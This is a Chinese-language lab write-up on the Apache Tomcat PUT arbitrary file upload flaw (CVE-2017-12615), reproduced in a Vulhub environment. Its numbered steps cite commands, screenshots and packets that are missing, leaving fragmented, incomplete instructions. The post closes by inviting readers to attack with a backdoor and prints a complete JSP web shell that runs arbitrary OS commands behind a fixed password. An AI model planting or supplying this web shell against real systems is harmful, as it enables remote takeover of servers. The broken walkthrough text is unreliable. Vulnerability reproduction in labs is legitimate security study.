# 原创
：  Apache Tomcat任意文件上传漏洞(CVE-2017-12615)

# Apache Tomcat任意文件上传漏洞(CVE-2017-12615)

## 一、漏洞起源

2017年9月19日，Apache Tomcat官方确认并修复了两个高危漏洞，漏洞CVE编号：CVE-2017-12615和CVE-2017-12616。

其中，远程代码执行漏洞（CVE-2017-12615） 影响的版本有： Apache Tomcat 7.0.0 - 7.0.79（7.0.81修复不完全） 。

当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件，并且能被服务器执行。

## 二、基本信息

## 三、漏洞复现

这里使用“Vulhub搭建漏洞测试靶场“。
1. 使用如下命令启动靶场环境。1. 查看ip地址。1. 查看端口信息。1. 进入靶场页面。1. 重新访问此页面来抓取数据包。1. 确认有没有“1.jsp”，访问以下网址返回下面页面可以确认没有。1. 将“Vulhub靶场”内的数据包复制后粘贴替换刚刚抓取到的数据包。1. 此处为刚刚查询的ip以及端口号。1. 放包后再次访问“1.jsp”，发现存在了。1. 如果想要进行攻击，只需将“shell”换成jsp的后门文件即可。
```
如：
&lt;%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%&gt;
     
    &lt;%!public static String excuteCmd(String c) {
     
    StringBuilder line = new StringBuilder();
     
    try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));
     
    String temp = null;while ((temp = buf.readLine()) != null) {
     
    line.append(temp+"\n");}buf.close();} catch (Exception e) {
     
    line.append(e.getMessage());}return line.toString();}%&gt;&lt;%if("023".equals(request.getParameter("pwd"))&amp;&amp;!"".equals(request.getParameter("cmd"))){
     
    out.println("&lt;pre&gt;"+excuteCmd(request.getParameter("cmd"))+"&lt;/pre&gt;");}else{out.println(":-)");}%&gt;
```
